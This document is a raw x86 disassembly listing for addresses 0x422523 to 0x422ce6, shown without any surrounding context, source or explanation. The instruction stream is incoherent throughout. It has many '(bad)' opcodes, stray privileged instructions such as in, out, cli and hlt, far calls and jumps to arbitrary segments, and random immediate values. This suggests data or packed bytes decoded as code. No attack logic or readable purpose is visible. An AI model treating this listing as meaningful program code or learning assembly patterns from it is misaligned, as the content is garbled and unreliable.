  422523:	test   BYTE PTR [ecx],0x57
  422526:	add    eax,0x3e4bd4ae
  42252b:	shr    DWORD PTR [ebp-0x6d],1
  42252e:	cwde   
  42252f:	mov    bl,0xcf
  422531:	sahf   
  422532:	adc    ebp,0x4b
  422535:	jge    0x4225a6
  422537:	push   ss
  422538:	ret    
  422539:	jecxz  0x422599
  42253b:	sub    BYTE PTR [ebp-0x9],cl
  42253e:	stc    
  42253f:	cli    
  422540:	stos   BYTE PTR es:[edi],al
  422541:	lds    eax,FWORD PTR [ebp+0x7fe86e91]
  422547:	scas   eax,DWORD PTR es:[edi]
  422548:	das    
  422549:	ja     0x422561
  42254b:	dec    edi
  42254c:	jg     0x422517
  42254e:	and    edx,edi
  422550:	inc    ecx
  422551:	mov    eax,0x66160406
  422556:	shr    DWORD PTR [eax-0x4c897194],0x1d
  42255d:	psubusb mm7,mm6
  422560:	test   al,0x87
  422562:	sbb    DWORD PTR [esi+eax*1],ebp
  422565:	sub    DWORD PTR [edx-0x730b671a],ebx
  42256b:	jg     0x42257b
  42256d:	cld    
  42256e:	sub    BYTE PTR [ebx-0x24],cl
  422571:	call   0xddc9:0x89b6869a
  422578:	pushf  
  422579:	les    edx,FWORD PTR [edi+0x1d04fac3]
  42257f:	dec    ebx
  422580:	(bad)  
  422581:	(bad)  
  422582:	je     0x422585
  422584:	ss (bad) 
  422587:	jge    0x422559
  422589:	stos   DWORD PTR es:[edi],eax
  42258a:	cmc    
  42258b:	icebp  
  42258c:	sbb    eax,0xea3b282c
  422591:	sub    al,BYTE PTR [esi]
  422593:	pop    ecx
  422594:	ins    DWORD PTR es:[edi],dx
  422595:	adc    BYTE PTR [esi],0xba
  422598:	xchg   BYTE PTR [edx-0x3b9ba8ed],dh
  42259e:	jmp    FWORD PTR [edx+0x3b]
  4225a1:	in     eax,dx
  4225a2:	mov    WORD PTR [esp-0x75a2fdcf],?
  4225a9:	xor    esi,esi
  4225ab:	inc    ebp
  4225ac:	inc    ecx
  4225ad:	test   al,0x9b
  4225af:	nop
  4225b0:	xor    BYTE PTR [eax-0x25],cl
  4225b3:	sub    al,0x7f
  4225b5:	add    eax,0x78929731
  4225ba:	test   esp,ebp
  4225bc:	mov    eax,0xce09d54c
  4225c1:	add    esi,DWORD PTR [ecx]
  4225c3:	lock dec esp
  4225c5:	lea    esi,[ebp+0x52]
  4225c8:	pop    esp
  4225c9:	mov    bh,ah
  4225cb:	dec    edx
  4225cc:	jo     0x4225bd
  4225ce:	xor    BYTE PTR [ecx+0x15],cl
  4225d1:	add    bh,BYTE PTR [edx-0x1141a17a]
  4225d7:	pop    esp
  4225d8:	cwde   
  4225d9:	inc    ebp
  4225da:	sub    eax,0x4cab9082
  4225df:	xor    DWORD PTR [eax+esi*2],eax
  4225e2:	fist   WORD PTR [edi-0x50223e89]
  4225e8:	jg     0x422596
  4225ea:	in     eax,dx
  4225eb:	out    dx,al
  4225ec:	test   eax,0x27020607
  4225f1:	out    0x1d,al
  4225f3:	les    ebp,FWORD PTR [esp+edi*4+0xf304cd1]
  4225fa:	pop    ss
  4225fb:	push   esi
  4225fc:	push   ebx
  4225fd:	push   edx
  4225fe:	imul   esi,DWORD PTR [ecx+0x1a],0x22ddec51
  422605:	cmp    eax,0x18d71637
  42260a:	in     al,dx
  42260b:	mov    bh,0x9
  42260d:	iret   
  42260e:	mov    bl,0xa0
  422610:	xchg   BYTE PTR [edi],bl
  422612:	adc    dl,dl
  422614:	popa   
  422615:	or     al,0xdc
  422617:	push   es
  422618:	retf   
  422619:	add    eax,0x6fd748fe
  42261e:	adc    dh,BYTE PTR [ecx+0x508df593]
  422624:	mov    al,ds:0x2838aa9b
  422629:	rol    DWORD PTR [edi+0x6719cbc3],cl
  42262f:	and    eax,0x1eb698d4
  422634:	push   0xc82bfe53
  422639:	jmp    0x55a4d282
  42263e:	inc    esi
  42263f:	adc    ebx,ebp
  422641:	leave  
  422642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422643:	cmp    ecx,DWORD PTR [ebx]
  422645:	xchg   esp,eax
  422646:	pop    ebp
  422647:	xchg   esi,eax
  422648:	pop    ebp
  422649:	adc    BYTE PTR [ebx+0xa52b31b],dl
  42264f:	into   
  422650:	div    DWORD PTR [ebp-0x7e]
  422653:	dec    eax
  422654:	(bad)  
  422656:	les    ebx,FWORD PTR [esi+0x4c67982e]
  42265c:	or     BYTE PTR [edx],bh
  42265e:	es mov eax,0x7fcf9879
  422664:	xchg   ebp,eax
  422665:	jecxz  0x422682
  422667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422668:	mov    bh,0xe9
  42266a:	dec    edx
  42266b:	(bad)
  42266f:	jle    0x4226aa
  422671:	xchg   ecx,eax
  422672:	push   edi
  422673:	in     eax,0x6
  422675:	mov    ebx,0x661a16b2
  42267a:	les    eax,FWORD PTR [edx+0x5e]
  42267d:	popf   
  42267e:	pop    eax
  42267f:	push   esi
  422680:	inc    ecx
  422681:	gs dec ebx
  422683:	sbb    al,0xc4
  422685:	gs scas eax,DWORD PTR es:[edi]
  422687:	push   es
  422688:	jo     0x422620
  42268a:	jp     0x42265c
  42268c:	xchg   BYTE PTR [edi],ah
  42268e:	add    ecx,DWORD PTR [edi]
  422690:	fcomp  DWORD PTR [eax]
  422692:	ss dec edx
  422694:	sub    DWORD PTR [ebx+0x3f],esi
  422697:	aad    0x8a
  422699:	mov    ah,0xec
  42269b:	pop    ebx
  42269c:	xlat   BYTE PTR ds:[ebx]
  42269d:	pop    edi
  42269e:	paddw  mm3,mm6
  4226a1:	sbb    DWORD PTR [ebp-0x51],ebx
  4226a4:	lds    ecx,FWORD PTR [eax+eax*2-0x4]
  4226a8:	xchg   esi,eax
  4226a9:	outs   dx,DWORD PTR ds:[esi]
  4226aa:	int    0x7e
  4226ac:	fmul   QWORD PTR ds:0x3e054148
  4226b2:	(bad)  
  4226b3:	fiadd  WORD PTR [esi-0x20]
  4226b6:	jnp    0x4226b7
  4226b8:	out    0xd1,al
  4226ba:	and    ecx,ecx
  4226bc:	mov    edx,0xbb5dfb06
  4226c1:	enter  0xec3d,0x4f
  4226c5:	jl     0x4226d3
  4226c7:	(bad)  
  4226c8:	icebp  
  4226c9:	test   al,0x86
  4226cb:	jp     0x42271a
  4226cd:	into   
  4226ce:	ret    
  4226cf:	pop    ecx
  4226d0:	frstor [esi]
  4226d2:	cmp    BYTE PTR [eax+0x66fef2f7],bl
  4226d8:	xchg   ch,bl
  4226da:	jae    0x4226e5
  4226dc:	(bad)  
  4226de:	cs test al,0xce
  4226e1:	xchg   esp,eax
  4226e2:	adc    BYTE PTR [eax],bl
  4226e4:	scas   eax,DWORD PTR es:[edi]
  4226e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e6:	lea    edi,[eax-0x71]
  4226e9:	xchg   BYTE PTR [esi-0x7d],dh
  4226ec:	mov    ah,BYTE PTR [eax-0x4c4a9d57]
  4226f2:	push   es
  4226f3:	jmp    0xe206da4b
  4226f8:	inc    eax
  4226f9:	ja     0x42276c
  4226fb:	xor    DWORD PTR [eax],edx
  4226fd:	fmul   DWORD PTR [eax+0x29]
  422700:	retf   
  422701:	leave  
  422702:	mov    edi,0x1b33f184
  422707:	sti    
  422708:	mov    bl,0x37
  42270a:	push   0xfffffffc
  42270c:	rcl    DWORD PTR [esi],cl
  42270e:	pusha  
  42270f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422710:	xor    BYTE PTR [edi+0x3aa7b9b9],al
  422716:	push   edx
  422717:	cmp    BYTE PTR [esi+0x3fe6b0d4],0xdc
  42271e:	mov    ch,0x74
  422720:	jo     0x4226e1
  422722:	cdq    
  422723:	pusha  
  422724:	adc    ah,BYTE PTR [eax+0x6ad64c8c]
  42272a:	jge    0x4226b4
  42272c:	add    BYTE PTR [esi+0x6c2ffdc0],al
  422732:	scas   al,BYTE PTR es:[edi]
  422733:	and    eax,0x2a38fcfc
  422738:	popa   
  422739:	addr16 sbb al,0x46
  42273c:	mov    cl,0x7d
  42273e:	aas    
  42273f:	stos   DWORD PTR es:[edi],eax
  422740:	rcr    DWORD PTR [edi+0x12724eb8],cl
  422746:	inc    esp
  422747:	jae    0x4227a0
  422749:	jg     0x4226ea
  42274b:	fnsave [esi-0x5cf4350d]
  422751:	daa    
  422752:	push   0x67
  422754:	push   es
  422755:	loope  0x4226dc
  422757:	jg     0x4227c6
  422759:	jo     0x42272c
  42275b:	inc    ebp
  42275c:	push   ebx
  42275d:	mov    BYTE PTR [edi],bl
  42275f:	and    dl,bl
  422761:	adc    BYTE PTR [ebx],al
  422763:	or     al,0xe
  422765:	mov    ecx,0xea696b11
  42276a:	add    DWORD PTR [esp+eiz*2-0x1d],edx
  42276e:	pop    ds
  42276f:	shl    dl,1
  422771:	sub    DWORD PTR ss:0xb5912e94,0xa4ad50fd
  42277c:	or     BYTE PTR [esi],al
  42277e:	pop    ebx
  42277f:	push   cs
  422780:	(bad)  
  422781:	clc    
  422782:	pop    esp
  422783:	pop    ebx
  422784:	mov    dl,0xfb
  422786:	jmp    0x422784
  422788:	jmp    FWORD PTR [edi-0x1]
  42278b:	in     eax,0xa3
  42278d:	imul   BYTE PTR [edx]
  42278f:	mov    ebp,0x1de41e54
  422794:	ins    DWORD PTR es:[edi],dx
  422795:	les    ebp,FWORD PTR [esi]
  422797:	add    DWORD PTR [esp+ebx*8],esp
  42279a:	mov    ah,0xd1
  42279c:	into   
  42279d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42279e:	rcr    DWORD PTR [eax+eiz*2],1
  4227a1:	jmp    0x4227ed
  4227a3:	retf   0xaebc
  4227a6:	and    al,0x3d
  4227a8:	test   eax,0x1220c20e
  4227ad:	inc    esp
  4227ae:	fs inc esp
  4227b0:	repnz lds ecx,FWORD PTR [ebx+0x4d]
  4227b4:	xchg   DWORD PTR [ebx+eiz*8+0x44],ebx
  4227b8:	cli    
  4227b9:	sub    DWORD PTR [ecx-0x29],ebx
  4227bc:	iret   
  4227bd:	dec    esi
  4227be:	aas    
  4227bf:	hlt    
  4227c0:	jb     0x4227a4
  4227c2:	cmp    esi,DWORD PTR [ecx+ebp*1-0xd]
  4227c6:	lock jb 0x422792
  4227c9:	(bad)  
  4227ca:	mov    al,0x3b
  4227cc:	dec    esp
  4227cd:	sti    
  4227ce:	dec    esp
  4227cf:	ret    0xce0
  4227d2:	ss sti 
  4227d4:	mov    ecx,0x778ae6d
  4227d9:	inc    eax
  4227da:	inc    ebx
  4227db:	jno    0x42279b
  4227dd:	push   ebx
  4227de:	or     DWORD PTR [ebx+0x57],0xdc78fb74
  4227e5:	adc    DWORD PTR ds:0xb3f27b6a,esp
  4227eb:	xor    BYTE PTR [ebx+0x1],cl
  4227ee:	aam    0x4c
  4227f0:	pop    es
  4227f1:	pminub mm5,QWORD PTR [ecx]
  4227f4:	cmc    
  4227f5:	in     eax,0xd6
  4227f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227f8:	test   BYTE PTR [ebx-0x39a4c6ef],dh
  4227fe:	jge    0x42285c
  422800:	jmp    0x8485:0xcab7fdd8
  422807:	push   esp
  422808:	push   ecx
  422809:	fdivr  QWORD PTR [edx]
  42280b:	xor    DWORD PTR [eax-0x2f7e7adb],edx
  422811:	popf   
  422812:	inc    ebx
  422813:	xchg   edx,eax
  422814:	es aaa 
  422816:	inc    eax
  422817:	cld    
  422818:	outs   dx,DWORD PTR ds:[esi]
  422819:	xchg   eax,ebx
  42281b:	loop   0x422809
  42281d:	jmp    0x42288c
  42281f:	iret   
  422820:	(bad)  
  422821:	shr    DWORD PTR [eax-0x55],1
  422824:	xchg   ecx,eax
  422825:	xor    ebx,DWORD PTR [ebx-0x5fe7902c]
  42282b:	pcmpgtb mm1,QWORD PTR [esi-0x7a]
  42282f:	inc    ecx
  422830:	clc    
  422831:	mov    ch,0xe2
  422833:	sbb    BYTE PTR [esi+0x7803fa6],bl
  422839:	les    esp,FWORD PTR [edx-0x80bb2ed]
  42283f:	cld    
  422840:	lods   eax,DWORD PTR ds:[esi]
  422841:	adc    BYTE PTR [edx+0x66],ch
  422844:	push   esi
  422845:	and    BYTE PTR [ecx-0x45],cl
  422848:	or     eax,0x3e8bf5b
  42284d:	or     DWORD PTR [edi-0x7f073dec],esi
  422853:	js     0x422884
  422855:	addr16 adc eax,0x41
  422859:	mov    eax,ds:0x41ffa8fc
  42285e:	outs   dx,BYTE PTR ds:[esi]
  42285f:	pop    ebp
  422860:	mov    bl,0xb7
  422862:	jno    0x422822
  422864:	gs int 0x10
  422867:	(bad)  
  422868:	jno    0x4228a7
  42286a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42286b:	push   edx
  42286c:	sbb    DWORD PTR [edi+eax*4],esp
  42286f:	mov    edx,?
  422871:	xchg   esp,eax
  422872:	mov    eax,0x7a2aa9f7
  422877:	sbb    BYTE PTR [eax+eax*4],dh
  42287a:	sbb    BYTE PTR [ebx-0x1fc25754],al
  422880:	ins    BYTE PTR es:[edi],dx
  422881:	psllw  mm1,QWORD PTR [esi]
  422884:	aas    
  422885:	and    eax,0x1bffa161
  42288a:	iret   
  42288b:	mov    ecx,DWORD PTR [ebp-0x1ec063e7]
  422891:	and    esi,DWORD PTR [ebx+eax*4+0x61f1a474]
  422898:	cli    
  422899:	ret    
  42289a:	xor    BYTE PTR [eax-0x235b40cc],0x7a
  4228a1:	repz adc eax,0x3d66e5b5
  4228a7:	pop    ecx
  4228a8:	pop    edi
  4228a9:	jp     0x4228ba
  4228ab:	pmaddwd mm0,QWORD PTR [ebx+0x64]
  4228af:	push   edi
  4228b0:	lahf   
  4228b1:	and    DWORD PTR [esi],esi
  4228b3:	add    DWORD PTR [ebx-0x69],edx
  4228b6:	mov    ds:0x895a703d,eax
  4228bb:	ss xchg ebp,eax
  4228bd:	xor    al,0xdb
  4228bf:	mov    ds,WORD PTR [eax+0x73]
  4228c2:	loop   0x4228d8
  4228c4:	sbb    BYTE PTR [ecx-0x195bba81],bh
  4228ca:	pop    esp
  4228cb:	mov    esi,0x6346edcd
  4228d0:	jecxz  0x4228d2
  4228d2:	(bad)  
  4228d3:	jecxz  0x42293d
  4228d5:	jle    0x42294d
  4228d7:	xlat   BYTE PTR ds:[ebx]
  4228d8:	mov    eax,ds:0x2691e2ea
  4228dd:	(bad)  [ebp-0x10cee747]
  4228e3:	(bad)  
  4228e4:	mov    edx,0x501ae584
  4228e9:	xor    eax,0x32223f58
  4228ee:	dec    edi
  4228ef:	jl     0x422879
  4228f1:	push   edi
  4228f2:	retf   
  4228f3:	cmp    eax,0xf97c4dc7
  4228f8:	mov    BYTE PTR [edx-0x739cb562],0xeb
  4228ff:	fbstp  TBYTE PTR ds:0xfdcf29c6
  422905:	mov    dl,BYTE PTR [eax-0x1c3e16a8]
  42290b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42290c:	mov    edx,0xd1757070
  422911:	test   DWORD PTR [edx+ebx*2-0x1a280f87],ebx
  422918:	imul   eax,DWORD PTR [ecx+0x7065f514],0xffffffd9
  42291f:	pop    esi
  422920:	or     eax,0x99024941
  422925:	push   ds
  422926:	rol    DWORD PTR [edx],1
  422928:	aaa    
  422929:	sti    
  42292a:	mov    esi,0x61db5437
  42292f:	fwait
  422930:	push   cs
  422931:	jmp    0xf5ddc100
  422936:	repz sub ebp,DWORD PTR [ebx+ebx*2+0x1]
  42293b:	int3   
  42293c:	pop    ds
  42293d:	daa    
  42293e:	dec    ebp
  42293f:	mov    DWORD PTR [esi+0x72],ebp
  422942:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422943:	jp     0x422964
  422945:	add    BYTE PTR [eax],al
  422947:	add    BYTE PTR [eax],al
  422949:	add    BYTE PTR [eax+0x50],cl
  42294c:	push   eax
  42294d:	dec    ebp
  42294e:	pop    eax
  42294f:	dec    ebp
  422950:	pop    ebp
  422951:	push   ebp
  422952:	stos   DWORD PTR es:[edi],eax
  422953:	mov    ch,0xf6
  422955:	stc    
  422956:	test   eax,0xebfef79d
  42295b:	mov    bh,0x1
  42295d:	add    BYTE PTR [ebx-0x76fffffa],al
  422963:	mov    dl,0xba
  422965:	or     DWORD PTR [esi+0x59],0x48
  422969:	and    esi,DWORD PTR [ebx-0x2d]
  42296c:	mov    esi,0xab99d438
  422971:	dec    DWORD PTR [ebp+0x2]
  422974:	push   eax
  422975:	sub    esp,DWORD PTR [ebp-0x20]
  422978:	push   0xf729439c
  42297d:	xchg   BYTE PTR [ecx],ch
  42297f:	call   0xee56:0x703a6e82
  422986:	call   0xea2a:0x71b5a019
  42298d:	pop    es
  42298e:	push   ss
  42298f:	sub    ah,dh
  422991:	cmp    al,0x39
  422993:	or     al,0x71
  422995:	fsub   QWORD PTR ds:0x4bd99e70
  42299b:	pusha  
  42299c:	or     esi,ecx
  42299e:	push   0xdcc894b7
  4229a3:	loopne 0x42296f
  4229a5:	and    BYTE PTR [eax],bl
  4229a7:	fcomp  DWORD PTR [ebx+0x5e]
  4229aa:	mov    WORD PTR [ecx+0xf],?
  4229ad:	sub    eax,0x329c9ddf
  4229b2:	dec    esp
  4229b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229b4:	add    BYTE PTR [ebp+edi*2-0x21],dl
  4229b8:	pop    ebx
  4229b9:	add    eax,0xb4b6c26d
  4229be:	addr16 xchg esp,eax
  4229c0:	push   ecx
  4229c1:	mov    cl,0xae
  4229c3:	out    0x7d,al
  4229c5:	popf   
  4229c6:	out    dx,al
  4229c7:	sub    bl,BYTE PTR [eax+0x4e5a36d3]
  4229cd:	fsubr  st(5),st
  4229cf:	sbb    dh,BYTE PTR [esp+edx*1+0x70e3875f]
  4229d6:	xchg   esi,eax
  4229d7:	test   al,0xf0
  4229d9:	or     ebp,0xd
  4229dc:	or     ch,cl
  4229de:	dec    edi
  4229df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229e0:	mov    al,ds:0xd8438b0b
  4229e5:	sar    DWORD PTR ds:[eax],cl
  4229e8:	xor    DWORD PTR [edi],ecx
  4229ea:	xchg   edx,eax
  4229eb:	lea    edi,[esi+0x10281864]
  4229f1:	in     al,dx
  4229f2:	popa   
  4229f3:	cmp    DWORD PTR [ecx+0x15c9a7fd],edi
  4229f9:	add    al,0xd3
  4229fb:	sti    
  4229fc:	lock sub cl,BYTE PTR [ebp+0x6d]
  422a00:	(bad)  
  422a02:	jns    0x422a5c
  422a04:	push   ds
  422a05:	out    0xf1,eax
  422a07:	inc    ecx
  422a08:	sbb    ah,bh
  422a0a:	sbb    DWORD PTR [edi+0x15],0xffffff97
  422a0e:	call   0xb056e16b
  422a13:	and    DWORD PTR [eax],edi
  422a15:	popa   
  422a16:	or     al,0xe1
  422a18:	or     eax,0xbcd6d81a
  422a1d:	xchg   esi,eax
  422a1e:	test   al,0xd7
  422a20:	aam    0x86
  422a22:	lock stc 
  422a24:	inc    edi
  422a25:	dec    ecx
  422a26:	cmp    ebx,DWORD PTR ds:0xa672d965
  422a2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a2d:	cld    
  422a2e:	sub    eax,0x14341537
  422a33:	bound  ebp,QWORD PTR [edi+0x3bda3606]
  422a39:	mov    ebx,0x43c1085e
  422a3e:	add    al,0x33
  422a40:	stos   DWORD PTR es:[edi],eax
  422a41:	lock gs dec esp
  422a44:	or     BYTE PTR [ebp+0x6b46f7fa],ch
  422a4a:	sub    eax,0x37679fa0
  422a4f:	fmul   st(0),st
  422a51:	outs   dx,DWORD PTR ds:[esi]
  422a52:	call   0xe223:0xbcfc0999
  422a59:	loope  0x422a54
  422a5b:	int3   
  422a5c:	dec    ebx
  422a5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a5e:	in     eax,dx
  422a5f:	inc    edi
  422a60:	fmul   QWORD PTR [edx]
  422a62:	lods   eax,DWORD PTR ds:[esi]
  422a63:	rcr    ecx,cl
  422a65:	clc    
  422a66:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  422a68:	cmp    al,0x29
  422a6a:	int    0x35
  422a6c:	xor    eax,0xf96eaec
  422a71:	inc    esi
  422a72:	fistp  WORD PTR [eax+0x3ae7d714]
  422a78:	sar    DWORD PTR [eax+0x24],1
  422a7b:	mov    ecx,0x2cc15c0e
  422a80:	add    BYTE PTR [eax-0x567b9c2c],ah
  422a86:	int    0x4d
  422a88:	fld    st(5)
  422a8a:	retf   0x2841
  422a8d:	jnp    0x422b08
  422a8f:	push   edx
  422a90:	sub    bh,dl
  422a92:	test   edi,eax
  422a94:	data16 mov cl,0xa1
  422a97:	lahf   
  422a98:	aaa    
  422a99:	push   ebp
  422a9a:	pop    esi
  422a9b:	pop    ecx
  422a9c:	rcr    BYTE PTR [ecx-0x8],1
  422a9f:	xchg   ecx,eax
  422aa0:	test   al,0x3
  422aa2:	xchg   ecx,eax
  422aa3:	icebp  
  422aa4:	or     eax,0x4c4c3f3d
  422aa9:	cmp    DWORD PTR [esi],0x3e
  422aac:	mov    al,ds:0xeec494b9
  422ab1:	jl     0x422a6d
  422ab3:	adc    DWORD PTR [ecx],eax
  422ab5:	test   DWORD PTR [edx],ebx
  422ab7:	push   cs
  422ab8:	add    bh,BYTE PTR [ebp-0x76290880]
  422abe:	jecxz  0x422b19
  422ac0:	ins    DWORD PTR es:[edi],dx
  422ac1:	xchg   ecx,eax
  422ac2:	sbb    BYTE PTR [eax+0x786245f4],dl
  422ac8:	jg     0x422a59
  422aca:	call   0xb6bb2aa3
  422acf:	add    esp,esi
  422ad1:	test   al,0x18
  422ad3:	and    ch,cl
  422ad5:	jnp    0x422a91
  422ad7:	jmp    0x9cc4:0x17de319d
  422ade:	pop    edi
  422adf:	imul   eax,DWORD PTR [edi],0xffffffa1
  422ae2:	jo     0x422b59
  422ae4:	mov    bl,0xc9
  422ae6:	and    al,0x1b
  422ae8:	cmp    al,0x26
  422aea:	imul   esp,DWORD PTR [ebp+0x2f],0xd18a9c2d
  422af1:	std    
  422af2:	and    ah,BYTE PTR [esi]
  422af4:	test   DWORD PTR [edx+0x6b],0x6db89f70
  422afb:	inc    ebx
  422afc:	std    
  422afd:	nop
  422afe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422aff:	pop    ds
  422b00:	js     0x422b7b
  422b02:	add    BYTE PTR [edx],0x68
  422b05:	call   0x6865d0a9
  422b0a:	imul   ebx,edx,0x10a246c3
  422b10:	or     BYTE PTR [edx+ecx*1],0x6a
  422b14:	sub    eax,0x492ccc5e
  422b19:	pop    edx
  422b1a:	pop    es
  422b1b:	push   esi
  422b1c:	inc    ecx
  422b1d:	sub    cl,dh
  422b1f:	ja     0x422ad9
  422b21:	sub    al,0xf5
  422b23:	(bad)  
  422b25:	int3   
  422b26:	fild   WORD PTR [ebp+0x7e235e8e]
  422b2c:	imul   ebp,DWORD PTR [edi],0xfffffff8
  422b2f:	ret    0x444
  422b32:	sbb    esp,DWORD PTR [edx+0x31]
  422b35:	jno    0x422ac7
  422b37:	adc    esi,esp
  422b39:	data16 sub ch,BYTE PTR [edx+0x2867bd5e]
  422b40:	fisubr DWORD PTR [ebx-0x62]
  422b43:	aaa    
  422b44:	jmp    0x422aef
  422b46:	lods   al,BYTE PTR ds:[esi]
  422b47:	mov    al,ds:0x448b0fb5
  422b4c:	jmp    0x2f5f:0xe8dad9cb
  422b53:	rcr    BYTE PTR [edx+0x17],1
  422b56:	or     al,0x25
  422b58:	sar    DWORD PTR [ecx+0x69],1
  422b5b:	add    DWORD PTR [eax],0xffffffec
  422b5e:	ins    DWORD PTR es:[edi],dx
  422b5f:	aaa    
  422b60:	sub    ebx,esi
  422b62:	(bad)  
  422b64:	int3   
  422b65:	xchg   eax,ebx
  422b67:	or     al,0x13
  422b69:	add    ebx,DWORD PTR [ecx-0x547fc2e5]
  422b6f:	sbb    bl,al
  422b71:	stc    
  422b72:	imul   ebx,ebp,0xffffff93
  422b75:	adc    BYTE PTR [eax-0x5356b590],0x8b
  422b7c:	call   0xb5f8ae21
  422b81:	sub    DWORD PTR [edi],eax
  422b83:	das    
  422b84:	jb     0x422be0
  422b86:	and    edi,DWORD PTR [ebp-0x96dcdc2]
  422b8c:	test   eax,0x7ab4aa91
  422b91:	cmp    eax,0x70fd4f44
  422b96:	pop    eax
  422b97:	(bad)  
  422b99:	(bad)  [ecx+0x4b]
  422b9c:	sub    dl,ah
  422b9e:	das    
  422b9f:	dec    ecx
  422ba0:	ret    
  422ba1:	fadd   st,st(3)
  422ba3:	adc    BYTE PTR [ecx-0x30],0x75
  422ba7:	mov    edx,0x8c7f77d
  422bac:	imul   ebp,DWORD PTR [edi-0x37],0xfffffffe
  422bb0:	adc    DWORD PTR [edx-0x11],ebp
  422bb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bb4:	xor    eax,0x2cb9c746
  422bb9:	mov    ecx,0xa6acd508
  422bbe:	loopne 0x422c2e
  422bc0:	push   ecx
  422bc1:	mov    ah,0x79
  422bc3:	repz inc esp
  422bc5:	adc    BYTE PTR [ebx-0x73],dh
  422bc8:	nop
  422bc9:	or     eax,0x94f9467e
  422bce:	iret   
  422bcf:	adc    ebx,DWORD PTR [ebx]
  422bd1:	ror    DWORD PTR [ecx-0x79f985ac],cl
  422bd7:	into   
  422bd8:	sub    BYTE PTR [ebp-0x6e],bl
  422bdb:	not    DWORD PTR [ebx-0x10016252]
  422be1:	daa    
  422be2:	mov    al,ds:0x65aa20c
  422be7:	inc    ebp
  422be8:	stc    
  422be9:	shr    DWORD PTR [edi-0x6deff667],1
  422bef:	sbb    ebx,DWORD PTR [esi-0x1b43269f]
  422bf5:	(bad)  
  422bf6:	sti    
  422bf7:	outs   dx,BYTE PTR ds:[esi]
  422bf8:	mov    dl,0x1b
  422bfa:	pushf  
  422bfb:	push   eax
  422bfc:	and    DWORD PTR ds:0xf161a6ec,esi
  422c02:	out    0xe5,al
  422c04:	cld    
  422c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c06:	pusha  
  422c07:	test   BYTE PTR [ecx],al
  422c09:	and    BYTE PTR [ebx],0x92
  422c0c:	std    
  422c0d:	daa    
  422c0e:	into   
  422c0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c10:	push   esi
  422c11:	aad    0xd0
  422c13:	push   ds
  422c14:	dec    eax
  422c15:	sub    dl,BYTE PTR [edx]
  422c17:	retf   0xc95f
  422c1a:	aam    0x8a
  422c1c:	sub    BYTE PTR [eax],0xe
  422c1f:	jnp    0x422c98
  422c21:	inc    ebx
  422c22:	add    al,0xf1
  422c24:	divps  xmm0,xmm3
  422c27:	dec    ecx
  422c28:	mov    ecx,0x3a00857d
  422c2d:	enter  0x10b8,0xf4
  422c31:	(bad)  
  422c32:	es loopne 0x422be5
  422c35:	fild   WORD PTR [ebp-0x49]
  422c38:	jge    0x422c9f
  422c3a:	push   0x5abb6a65
  422c3f:	or     eax,0x7c25bcff
  422c44:	lock test DWORD PTR [ebp+edx*8-0x23c05647],esp
  422c4c:	pop    ds
  422c4d:	cwde   
  422c4e:	outs   dx,DWORD PTR ds:[esi]
  422c4f:	cld    
  422c50:	in     al,dx
  422c51:	out    dx,al
  422c52:	(bad)  
  422c53:	xlat   BYTE PTR ds:[ebx]
  422c54:	push   ss
  422c55:	add    DWORD PTR [ecx],ecx
  422c57:	stos   BYTE PTR es:[edi],al
  422c58:	pushf  
  422c59:	sbb    eax,0xe8d9ba1c
  422c5e:	stc    
  422c5f:	imul   BYTE PTR fs:[edx+0x14e8f962]
  422c66:	pop    esp
  422c67:	(bad)  
  422c68:	out    dx,al
  422c69:	std    
  422c6a:	(bad)  
  422c6b:	mov    ebp,0x7fb4075b
  422c70:	(bad)  
  422c71:	fstp   QWORD PTR [edx-0x33]
  422c74:	lea    esi,[ebp-0xc]
  422c77:	add    ecx,DWORD PTR [esi+0xe22b38e]
  422c7d:	cmp    bl,BYTE PTR [edi-0x29]
  422c80:	repnz add BYTE PTR [esi+0x1f],ch
  422c84:	retf   
  422c85:	jmp    0x6fe887b7
  422c8a:	test   BYTE PTR [esi-0x40],dl
  422c8d:	popf   
  422c8e:	int3   
  422c8f:	adc    eax,0x31579f58
  422c94:	pop    ss
  422c95:	jbe    0x422cb7
  422c97:	mov    esp,edi
  422c99:	xor    ah,dh
  422c9b:	sbb    BYTE PTR [esi+0x4e],cl
  422c9e:	ds and al,0x24
  422ca1:	and    DWORD PTR [ebp+ecx*8+0x6c39cfc],ebp
  422ca8:	push   0x6827b90a
  422cad:	add    DWORD PTR [ebx-0x4],ebx
  422cb0:	popf   
  422cb1:	(bad)  
  422cb2:	jecxz  0x422cc4
  422cb4:	cmp    BYTE PTR [ecx+0x65],ah
  422cb7:	lds    eax,FWORD PTR [eax+esi*2]
  422cba:	outs   dx,DWORD PTR ds:[esi]
  422cbb:	les    ebx,FWORD PTR [eax]
  422cbd:	(bad)  
  422cbf:	pop    esi
  422cc0:	clc    
  422cc1:	mov    esp,0x7152da
  422cc6:	xchg   edi,eax
  422cc7:	sub    bl,BYTE PTR [edi]
  422cc9:	dec    ebx
  422cca:	inc    ebx
  422ccb:	call   0xeaf43a8
  422cd0:	mov    al,0xb0
  422cd2:	addr16 dec ebx
  422cd4:	inc    esp
  422cd5:	push   ebp
  422cd6:	hlt    
  422cd7:	test   eax,0x708c47e6
  422cdc:	xchg   ebp,eax
  422cdd:	or     eax,edi
  422cdf:	jp     0x422d50
  422ce1:	xchg   BYTE PTR [ecx],bh
  422ce3:	clc    
  422ce4:	sub    al,0xff
  422ce6:	hlt    
